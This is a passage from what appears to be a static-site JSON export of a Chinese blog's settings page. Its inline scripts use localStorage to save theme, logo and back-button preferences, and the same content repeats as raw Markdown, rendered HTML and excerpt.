14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z\"></path></svg></label>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"night\">暗<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M11.3807 2.01886C9.91573 3.38768 9 5.3369 9 7.49999C9 11.6421 12.3579 15 16.5 15C18.6631 15 20.6123 14.0843 21.9811 12.6193C21.6613 17.8537 17.3149 22 12 22C6.47715 22 2 17.5228 2 12C2 6.68514 6.14629 2.33869 11.3807 2.01886Z\"></path></svg></label>\n</fieldset>\n\n<script>\n    var themeSetting = localStorage.getItem('color-scheme') || 'auto';\n    (document.querySelector(`input[name=theme-radio][value=${themeSetting}]`)||document.querySelector('input[name=theme-radio][value=auto]')).checked = true;\n    function switchThemeTo(colorScheme){\n        localStorage.setItem(\"color-scheme\", colorScheme);\n        scheme = colorScheme==='auto'?(matchMedia('(prefers-color-scheme: dark)').matches?\"night\":\"light\"):colorScheme;\n        if(scheme==='light'){\n            document.getElementById(\"sun\").style.display = \"none\";\n            document.getElementById(\"moon\").style.display = \"\";\n            let classlist = document.querySelector(\"html\").classList;\n            classlist.remove('night');\n            classlist.add('light');\n        }else{\n            document.getElementById(\"sun\").style.display = \"\";\n            document.getElementById(\"moon\").style.display = \"none\";\n            let classlist = document.querySelector(\"html\").classList;\n            classlist.add('night');\n            classlist.remove('light');\n        }\n    }\n    document.querySelectorAll('input[name=theme-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchThemeTo(input.value)\n        }))(input))\n    })\n    document.getElementById(\"sun\").addEventListener(\"click\", ()=>{\n        document.querySelector('input[name=theme-radio][value=light]').checked = true;\n    })\n    document.getElementById(\"moon\").addEventListener(\"click\", ()=>{\n        document.querySelector('input[name=theme-radio][value=night]').checked = true;\n    })\n</script>\n\n## Logo\n\n<fieldset>\n<legend>额外显示Logo</legend>\n<label style=\"display: flex\"><input name=\"logo-radio\" type=\"radio\" value=\"show\">显示额外的 Logo！😜</label>\n<label style=\"display: flex\"><input name=\"logo-radio\" type=\"radio\" value=\"none\">你搞这么花干什么啊😡</label>\n</fieldset>\n\n<script>\n    var logoSetting = localStorage.getItem('extra-logo') || 'show';\n    switchLogoTo(logoSetting);\n    (document.querySelector(`input[name=logo-radio][value=${logoSetting}]`)||document.querySelector('input[name=logo-radio][value=show]')).checked = true;\n    document.getElementById(\"extra-logo\").style.display = 'flex';\n    function switchLogoTo(logo){\n        localStorage.setItem(\"extra-logo\", logo);\n        if(logo==='none'){\n            // document.getElementById(\"extra-logo\").style.display = 'none';\n            document.getElementById(\"extra-logo\").style.opacity = '0';\n        }else{\n            // document.getElementById(\"extra-logo\").style.display = 'flex';\n            document.getElementById(\"extra-logo\").style.opacity = '1';\n        }\n    }\n    document.querySelectorAll('input[name=logo-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchLogoTo(input.value)\n        }))(input))\n    })\n</script>\n\n## 返回按钮\n\n<fieldset>\n<legend>返回按钮逻辑</legend>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"session\">在<code>sessionStorage</code>中记录返回地址</label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"referer\">使用<code>Referer</code>作为返回地址</label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"history\">执行<code>history.back()</code></label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"none\">我不要这些乱七八糟的功能</label>\n<div id=\"backbtn-explain\" style=\"margin: 10px; border: 1px solid; padding: 5px\"></div>\n</fieldset>\n\n<script>\n    var backFunc = localStorage.getItem(\"backbtn-func\") || \"session\";\n    const backExplain = {\n        session: '<span>使用<code>sessionStorage</code>存储访问过的界面以模拟返回按钮</span><br/><span style=\"color: red\">缺点：会在浏览器自带的History里面拉屎，每点一次都会被当成“前进”</span>',\n        referer: '<span>使用<code>document.referer</code>作为返回目标</span><br/><span style=\"color: red\">缺点：只能返回一层，若使用了“上一篇”/“下一篇”等功能就会在两个页面来回跳</span>',\n        history: '<span>使用<code>History API</code>，与浏览器回退按钮功能一致</span><br/><span style=\"color: red\">缺点：锚点会被当成返回点，使用过目录功能后会在同一个页面上跳来跳去</span>',\n        none: '<span style=\"color: red\">解决问题的终极方法就是解决提出问题的人/事！</span>'\n    }\n    function backChoose(opt){\n        (document.querySelector(`input[name=backbtn-radio][value=${opt}]`)||document.querySelector('input[name=backbtn-radio][value=session]')).checked = true;\n        document.getElementById(\"backbtn-explain\").innerHTML = backExplain[opt] || backExplain['session'];\n    }\n    backChoose(backFunc);\n    function switchBackTo(opt){\n        localStorage.setItem(\"backbtn-func\", opt);\n        document.getElementById(\"backbtn-explain\").innerHTML = backExplain[opt] || backExplain['session'];\n    }\n    document.querySelectorAll('input[name=backbtn-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchBackTo(input.value)\n        }))(input))\n    })\n</script>","source":"features/index.md","raw":"---\ntitle: 特性修改\ndate: 2026-1-4 17:20:11\ntoc: true\n---\n\n本站有很多圆周率自己加的史，如果您不想要这些特性，可以在这里修改\n\n**注意：本页的选项均使用localStorage存储，请使用支持localStorage的浏览器**\n\n<p id=\"support-storage\" class=\"unknow\">正在检测你的浏览器是否支持localStorage……🔎</p>\n\n<style>\n    .unknow{\n        border: 1px hsla(54, 88%, 24%, 1.00) solid;\n        color: hsla(54, 88%, 24%, 1.00);\n        background-color: hsla(54, 90%, 85%, 1.00);\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .support{\n        border: 1px #077207 solid;\n        color: #077207;\n        background-color: #b4fbb4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .unsupport{\n        border: 1px #720707 solid;\n        color: #720707;\n        background-color: #fbb4b4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n</style>\n\n<script>\n    function test(){\n        try{\n            localStorage.setItem('test', 'ok');\n            var result = localStorage.getItem('test') == 'ok';\n            localStorage.removeItem('test');\n            return result;\n        }catch(error){\n            console.error(error);\n            return false;\n        }\n    }\n    let result = test();\n    document.getElementById('support-storage').classList.remove('unknow')\n    if(result){\n        document.getElementById('support-storage').innerText = '你的浏览器支持localStorage！🎉🎉🎉'\n        document.getElementById('support-storage').classList.add('support')\n    }else{\n        document.getElementById('support-storage').innerText = '你的浏览器好像不支持localStorage！🤔'\n        document.getElementById('support-storage').classList.add('unsupport')\n    }\n</script>\n\n## 明/暗主题\n\n<fieldset>\n<legend>主题</legend>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"auto\">跟随系统<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M12 21.9967C6.47715 21.9967 2 17.5196 2 11.9967C2 6.47386 6.47715 1.9967 12 1.9967C17.5228 1.9967 22 6.47386 22 11.9967C22 17.5196 17.5228 21.9967 12 21.9967ZM12 19.9967C16.4183 19.9967 20 16.415 20 11.9967C20 7.57843 16.4183 3.9967 12 3.9967C7.58172 3.9967 4 7.57843 4 11.9967C4 16.415 7.58172 19.9967 12 19.9967ZM7.00035 15.316C9.07995 15.1646 11.117 14.2939 12.7071 12.7038C14.2972 11.1137 15.1679 9.07666 15.3193 6.99706C15.6454 7.21408 15.955 7.46642 16.2426 7.75406C18.5858 10.0972 18.5858 13.8962 16.2426 16.2393C13.8995 18.5825 10.1005 18.5825 7.75736 16.2393C7.46971 15.9517 7.21738 15.6421 7.00035 15.316Z\"></path></svg><span title=\"使用媒体查询自动选择\" style=\"text-decoration: underline; text-decoration-style: dotted;\">?</span></label>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"light\">亮<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z\"></path></svg></label>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"night\">暗<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M11.3807 2.01886C9.91573 3.38768 9 5.3369 9 7.49999C9 11.6421 12.3579 15 16.5 15C18.6631 15 20.6123 14.0843 21.9811 12.6193C21.6613 17.8537 17.3149 22 12 22C6.47715 22 2 17.5228 2 12C2 6.68514 6.14629 2.33869 11.3807 2.01886Z\"></path></svg></label>\n</fieldset>\n\n<script>\n    var themeSetting = localStorage.getItem('color-scheme') || 'auto';\n    (document.querySelector(`input[name=theme-radio][value=${themeSetting}]`)||document.querySelector('input[name=theme-radio][value=auto]')).checked = true;\n    function switchThemeTo(colorScheme){\n        localStorage.setItem(\"color-scheme\", colorScheme);\n        scheme = colorScheme==='auto'?(matchMedia('(prefers-color-scheme: dark)').matches?\"night\":\"light\"):colorScheme;\n        if(scheme==='light'){\n            document.getElementById(\"sun\").style.display = \"none\";\n            document.getElementById(\"moon\").style.display = \"\";\n            let classlist = document.querySelector(\"html\").classList;\n            classlist.remove('night');\n            classlist.add('light');\n        }else{\n            document.getElementById(\"sun\").style.display = \"\";\n            document.getElementById(\"moon\").style.display = \"none\";\n            let classlist = document.querySelector(\"html\").classList;\n            classlist.add('night');\n            classlist.remove('light');\n        }\n    }\n    document.querySelectorAll('input[name=theme-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchThemeTo(input.value)\n        }))(input))\n    })\n    document.getElementById(\"sun\").addEventListener(\"click\", ()=>{\n        document.querySelector('input[name=theme-radio][value=light]').checked = true;\n    })\n    document.getElementById(\"moon\").addEventListener(\"click\", ()=>{\n        document.querySelector('input[name=theme-radio][value=night]').checked = true;\n    })\n</script>\n\n## Logo\n\n<fieldset>\n<legend>额外显示Logo</legend>\n<label style=\"display: flex\"><input name=\"logo-radio\" type=\"radio\" value=\"show\">显示额外的 Logo！😜</label>\n<label style=\"display: flex\"><input name=\"logo-radio\" type=\"radio\" value=\"none\">你搞这么花干什么啊😡</label>\n</fieldset>\n\n<script>\n    var logoSetting = localStorage.getItem('extra-logo') || 'show';\n    switchLogoTo(logoSetting);\n    (document.querySelector(`input[name=logo-radio][value=${logoSetting}]`)||document.querySelector('input[name=logo-radio][value=show]')).checked = true;\n    document.getElementById(\"extra-logo\").style.display = 'flex';\n    function switchLogoTo(logo){\n        localStorage.setItem(\"extra-logo\", logo);\n        if(logo==='none'){\n            // document.getElementById(\"extra-logo\").style.display = 'none';\n            document.getElementById(\"extra-logo\").style.opacity = '0';\n        }else{\n            // document.getElementById(\"extra-logo\").style.display = 'flex';\n            document.getElementById(\"extra-logo\").style.opacity = '1';\n        }\n    }\n    document.querySelectorAll('input[name=logo-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchLogoTo(input.value)\n        }))(input))\n    })\n</script>\n\n## 返回按钮\n\n<fieldset>\n<legend>返回按钮逻辑</legend>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"session\">在<code>sessionStorage</code>中记录返回地址</label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"referer\">使用<code>Referer</code>作为返回地址</label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"history\">执行<code>history.back()</code></label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"none\">我不要这些乱七八糟的功能</label>\n<div id=\"backbtn-explain\" style=\"margin: 10px; border: 1px solid; padding: 5px\"></div>\n</fieldset>\n\n<script>\n    var backFunc = localStorage.getItem(\"backbtn-func\") || \"session\";\n    const backExplain = {\n        session: '<span>使用<code>sessionStorage</code>存储访问过的界面以模拟返回按钮</span><br/><span style=\"color: red\">缺点：会在浏览器自带的History里面拉屎，每点一次都会被当成“前进”</span>',\n        referer: '<span>使用<code>document.referer</code>作为返回目标</span><br/><span style=\"color: red\">缺点：只能返回一层，若使用了“上一篇”/“下一篇”等功能就会在两个页面来回跳</span>',\n        history: '<span>使用<code>History API</code>，与浏览器回退按钮功能一致</span><br/><span style=\"color: red\">缺点：锚点会被当成返回点，使用过目录功能后会在同一个页面上跳来跳去</span>',\n        none: '<span style=\"color: red\">解决问题的终极方法就是解决提出问题的人/事！</span>'\n    }\n    function backChoose(opt){\n        (document.querySelector(`input[name=backbtn-radio][value=${opt}]`)||document.querySelector('input[name=backbtn-radio][value=session]')).checked = true;\n        document.getElementById(\"backbtn-explain\").innerHTML = backExplain[opt] || backExplain['session'];\n    }\n    backChoose(backFunc);\n    function switchBackTo(opt){\n        localStorage.setItem(\"backbtn-func\", opt);\n        document.getElementById(\"backbtn-explain\").innerHTML = backExplain[opt] || backExplain['session'];\n    }\n    document.querySelectorAll('input[name=backbtn-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchBackTo(input.value)\n        }))(input))\n    })\n</script>","updated":"2026-01-04T15:33:52.228Z","path":"features/index.html","comments":1,"layout":"page","_id":"cmk9p9p3r0002h4vbephtbbi2","content":"<p>本站有很多圆周率自己加的史，如果您不想要这些特性，可以在这里修改</p>\n<p><strong>注意：本页的选项均使用localStorage存储，请使用支持localStorage的浏览器</strong></p>\n<p id=\"support-storage\" class=\"unknow\">正在检测你的浏览器是否支持localStorage……🔎</p>\n\n<style>\n    .unknow{\n        border: 1px hsla(54, 88%, 24%, 1.00) solid;\n        color: hsla(54, 88%, 24%, 1.00);\n        background-color: hsla(54, 90%, 85%, 1.00);\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .support{\n        border: 1px #077207 solid;\n        color: #077207;\n        background-color: #b4fbb4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .unsupport{\n        border: 1px #720707 solid;\n        color: #720707;\n        background-color: #fbb4b4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n</style>\n\n<script>\n    function test(){\n        try{\n            localStorage.setItem('test', 'ok');\n            var result = localStorage.getItem('test') == 'ok';\n            localStorage.removeItem('test');\n            return result;\n        }catch(error){\n            console.error(error);\n            return false;\n        }\n    }\n    let result = test();\n    document.getElementById('support-storage').classList.remove('unknow')\n    if(result){\n        document.getElementById('support-storage').innerText = '你的浏览器支持localStorage！🎉🎉🎉'\n        document.getElementById('support-storage').classList.add('support')\n    }else{\n        document.getElementById('support-storage').innerText = '你的浏览器好像不支持localStorage！🤔'\n        document.getElementById('support-storage').classList.add('unsupport')\n    }\n</script>\n\n<h2 id=\"明-暗主题\"><a href=\"#明-暗主题\" class=\"headerlink\" title=\"明&#x2F;暗主题\"></a>明&#x2F;暗主题</h2><fieldset>\n<legend>主题</legend>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"auto\">跟随系统<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M12 21.9967C6.47715 21.9967 2 17.5196 2 11.9967C2 6.47386 6.47715 1.9967 12 1.9967C17.5228 1.9967 22 6.47386 22 11.9967C22 17.5196 17.5228 21.9967 12 21.9967ZM12 19.9967C16.4183 19.9967 20 16.415 20 11.9967C20 7.57843 16.4183 3.9967 12 3.9967C7.58172 3.9967 4 7.57843 4 11.9967C4 16.415 7.58172 19.9967 12 19.9967ZM7.00035 15.316C9.07995 15.1646 11.117 14.2939 12.7071 12.7038C14.2972 11.1137 15.1679 9.07666 15.3193 6.99706C15.6454 7.21408 15.955 7.46642 16.2426 7.75406C18.5858 10.0972 18.5858 13.8962 16.2426 16.2393C13.8995 18.5825 10.1005 18.5825 7.75736 16.2393C7.46971 15.9517 7.21738 15.6421 7.00035 15.316Z\"></path></svg><span title=\"使用媒体查询自动选择\" style=\"text-decoration: underline; text-decoration-style: dotted;\">?</span></label>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"light\">亮<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z\"></path></svg></label>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"night\">暗<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M11.3807 2.01886C9.91573 3.38768 9 5.3369 9 7.49999C9 11.6421 12.3579 15 16.5 15C18.6631 15 20.6123 14.0843 21.9811 12.6193C21.6613 17.8537 17.3149 22 12 22C6.47715 22 2 17.5228 2 12C2 6.68514 6.14629 2.33869 11.3807 2.01886Z\"></path></svg></label>\n</fieldset>\n\n<script>\n    var themeSetting = localStorage.getItem('color-scheme') || 'auto';\n    (document.querySelector(`input[name=theme-radio][value=${themeSetting}]`)||document.querySelector('input[name=theme-radio][value=auto]')).checked = true;\n    function switchThemeTo(colorScheme){\n        localStorage.setItem(\"color-scheme\", colorScheme);\n        scheme = colorScheme==='auto'?(matchMedia('(prefers-color-scheme: dark)').matches?\"night\":\"light\"):colorScheme;\n        if(scheme==='light'){\n            document.getElementById(\"sun\").style.display = \"none\";\n            document.getElementById(\"moon\").style.display = \"\";\n            let classlist = document.querySelector(\"html\").classList;\n            classlist.remove('night');\n            classlist.add('light');\n        }else{\n            document.getElementById(\"sun\").style.display = \"\";\n            document.getElementById(\"moon\").style.display = \"none\";\n            let classlist = document.querySelector(\"html\").classList;\n            classlist.add('night');\n            classlist.remove('light');\n        }\n    }\n    document.querySelectorAll('input[name=theme-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchThemeTo(input.value)\n        }))(input))\n    })\n    document.getElementById(\"sun\").addEventListener(\"click\", ()=>{\n        document.querySelector('input[name=theme-radio][value=light]').checked = true;\n    })\n    document.getElementById(\"moon\").addEventListener(\"click\", ()=>{\n        document.querySelector('input[name=theme-radio][value=night]').checked = true;\n    })\n</script>\n\n<h2 id=\"Logo\"><a href=\"#Logo\" class=\"headerlink\" title=\"Logo\"></a>Logo</h2><fieldset>\n<legend>额外显示Logo</legend>\n<label style=\"display: flex\"><input name=\"logo-radio\" type=\"radio\" value=\"show\">显示额外的 Logo！😜</label>\n<label style=\"display: flex\"><input name=\"logo-radio\" type=\"radio\" value=\"none\">你搞这么花干什么啊😡</label>\n</fieldset>\n\n<script>\n    var logoSetting = localStorage.getItem('extra-logo') || 'show';\n    switchLogoTo(logoSetting);\n    (document.querySelector(`input[name=logo-radio][value=${logoSetting}]`)||document.querySelector('input[name=logo-radio][value=show]')).checked = true;\n    document.getElementById(\"extra-logo\").style.display = 'flex';\n    function switchLogoTo(logo){\n        localStorage.setItem(\"extra-logo\", logo);\n        if(logo==='none'){\n            // document.getElementById(\"extra-logo\").style.display = 'none';\n            document.getElementById(\"extra-logo\").style.opacity = '0';\n        }else{\n            // document.getElementById(\"extra-logo\").style.display = 'flex';\n            document.getElementById(\"extra-logo\").style.opacity = '1';\n        }\n    }\n    document.querySelectorAll('input[name=logo-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchLogoTo(input.value)\n        }))(input))\n    })\n</script>\n\n<h2 id=\"返回按钮\"><a href=\"#返回按钮\" class=\"headerlink\" title=\"返回按钮\"></a>返回按钮</h2><fieldset>\n<legend>返回按钮逻辑</legend>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"session\">在<code>sessionStorage</code>中记录返回地址</label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"referer\">使用<code>Referer</code>作为返回地址</label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"history\">执行<code>history.back()</code></label>\n<label style=\"display: flex\"><input name=\"backbtn-radio\" type=\"radio\" value=\"none\">我不要这些乱七八糟的功能</label>\n<div id=\"backbtn-explain\" style=\"margin: 10px; border: 1px solid; padding: 5px\"></div>\n</fieldset>\n\n<script>\n    var backFunc = localStorage.getItem(\"backbtn-func\") || \"session\";\n    const backExplain = {\n        session: '<span>使用<code>sessionStorage</code>存储访问过的界面以模拟返回按钮</span><br/><span style=\"color: red\">缺点：会在浏览器自带的History里面拉屎，每点一次都会被当成“前进”</span>',\n        referer: '<span>使用<code>document.referer</code>作为返回目标</span><br/><span style=\"color: red\">缺点：只能返回一层，若使用了“上一篇”/“下一篇”等功能就会在两个页面来回跳</span>',\n        history: '<span>使用<code>History API</code>，与浏览器回退按钮功能一致</span><br/><span style=\"color: red\">缺点：锚点会被当成返回点，使用过目录功能后会在同一个页面上跳来跳去</span>',\n        none: '<span style=\"color: red\">解决问题的终极方法就是解决提出问题的人/事！</span>'\n    }\n    function backChoose(opt){\n        (document.querySelector(`input[name=backbtn-radio][value=${opt}]`)||document.querySelector('input[name=backbtn-radio][value=session]')).checked = true;\n        document.getElementById(\"backbtn-explain\").innerHTML = backExplain[opt] || backExplain['session'];\n    }\n    backChoose(backFunc);\n    function switchBackTo(opt){\n        localStorage.setItem(\"backbtn-func\", opt);\n        document.getElementById(\"backbtn-explain\").innerHTML = backExplain[opt] || backExplain['session'];\n    }\n    document.querySelectorAll('input[name=backbtn-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchBackTo(input.value)\n        }))(input))\n    })\n</script>","excerpt":"","more":"<p>本站有很多圆周率自己加的史，如果您不想要这些特性，可以在这里修改</p>\n<p><strong>注意：本页的选项均使用localStorage存储，请使用支持localStorage的浏览器</strong></p>\n<p id=\"support-storage\" class=\"unknow\">正在检测你的浏览器是否支持localStorage……🔎</p>\n\n<style>\n    .unknow{\n        border: 1px hsla(54, 88%, 24%, 1.00) solid;\n        color: hsla(54, 88%, 24%, 1.00);\n        background-color: hsla(54, 90%, 85%, 1.00);\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .support{\n        border: 1px #077207 solid;\n        color: #077207;\n        background-color: #b4fbb4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n    .unsupport{\n        border: 1px #720707 solid;\n        color: #720707;\n        background-color: #fbb4b4;\n        border-radius: 5px;\n        padding: 5px;\n        width: fit-content;\n    }\n</style>\n\n<script>\n    function test(){\n        try{\n            localStorage.setItem('test', 'ok');\n            var result = localStorage.getItem('test') == 'ok';\n            localStorage.removeItem('test');\n            return result;\n        }catch(error){\n            console.error(error);\n            return false;\n        }\n    }\n    let result = test();\n    document.getElementById('support-storage').classList.remove('unknow')\n    if(result){\n        document.getElementById('support-storage').innerText = '你的浏览器支持localStorage！🎉🎉🎉'\n        document.getElementById('support-storage').classList.add('support')\n    }else{\n        document.getElementById('support-storage').innerText = '你的浏览器好像不支持localStorage！🤔'\n        document.getElementById('support-storage').classList.add('unsupport')\n    }\n</script>\n\n<h2 id=\"明-暗主题\"><a href=\"#明-暗主题\" class=\"headerlink\" title=\"明&#x2F;暗主题\"></a>明&#x2F;暗主题</h2><fieldset>\n<legend>主题</legend>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"auto\">跟随系统<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M12 21.9967C6.47715 21.9967 2 17.5196 2 11.9967C2 6.47386 6.47715 1.9967 12 1.9967C17.5228 1.9967 22 6.47386 22 11.9967C22 17.5196 17.5228 21.9967 12 21.9967ZM12 19.9967C16.4183 19.9967 20 16.415 20 11.9967C20 7.57843 16.4183 3.9967 12 3.9967C7.58172 3.9967 4 7.57843 4 11.9967C4 16.415 7.58172 19.9967 12 19.9967ZM7.00035 15.316C9.07995 15.1646 11.117 14.2939 12.7071 12.7038C14.2972 11.1137 15.1679 9.07666 15.3193 6.99706C15.6454 7.21408 15.955 7.46642 16.2426 7.75406C18.5858 10.0972 18.5858 13.8962 16.2426 16.2393C13.8995 18.5825 10.1005 18.5825 7.75736 16.2393C7.46971 15.9517 7.21738 15.6421 7.00035 15.316Z\"></path></svg><span title=\"使用媒体查询自动选择\" style=\"text-decoration: underline; text-decoration-style: dotted;\">?</span></label>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"light\">亮<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z\"></path></svg></label>\n<label style=\"display: flex\"><input name=\"theme-radio\" type=\"radio\" value=\"night\">暗<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\" fill=\"currentColor\" style=\"width: 1em;\"><path d=\"M11.3807 2.01886C9.91573 3.38768 9 5.3369 9 7.49999C9 11.6421 12.3579 15 16.5 15C18.6631 15 20.6123 14.0843 21.9811 12.6193C21.6613 17.8537 17.3149 22 12 22C6.47715 22 2 17.5228 2 12C2 6.68514 6.14629 2.33869 11.3807 2.01886Z\"></path></svg></label>\n</fieldset>\n\n<script>\n    var themeSetting = localStorage.getItem('color-scheme') || 'auto';\n    (document.querySelector(`input[name=theme-radio][value=${themeSetting}]`)||document.querySelector('input[name=theme-radio][value=auto]')).checked = true;\n    function switchThemeTo(colorScheme){\n        localStorage.setItem(\"color-scheme\", colorScheme);\n        scheme = colorScheme==='auto'?(matchMedia('(prefers-color-scheme: dark)').matches?\"night\":\"light\"):colorScheme;\n        if(scheme==='light'){\n            document.getElementById(\"sun\").style.display = \"none\";\n            document.getElementById(\"moon\").style.display = \"\";\n            let classlist = document.querySelector(\"html\").classList;\n            classlist.remove('night');\n            classlist.add('light');\n        }else{\n            document.getElementById(\"sun\").style.display = \"\";\n            document.getElementById(\"moon\").style.display = \"none\";\n            let classlist = document.querySelector(\"html\").classList;\n            classlist.add('night');\n            classlist.remove('light');\n        }\n    }\n    document.querySelectorAll('input[name=theme-radio]').forEach((input)=>{\n        input.addEventListener(\"change\", ((input)=>(()=>{\n            switchThemeTo(input.value)\n        }))(input))\n    })\n    document.getElementById(\"sun\").addEventListener(\"click\", ()=>{\n        document.querySelector('input[name=theme-radio][value=light]').checked = true;\n    })\n    document.getElementById(\"moon\").addEventListener(\"click\", ()=>{\n        document.querySelector('input[name=theme-radio][value=night]').checked = true;\n    })\n</script>\n\n<h2 id=\"Logo\"><a href=\"#Logo\" class=\"headerlink\" title=\"Logo\"></a>Logo</h2><fieldset>\n<legend>额外显示Logo</legend>\n<label style=\"display: flex\"><input name=\"logo-radio\" type=\"radio\" value=\"show\">显示额外的 Logo！😜</label>\n<label style=\"display: flex\"><input name=\"logo-radio\" type=\"radio\" 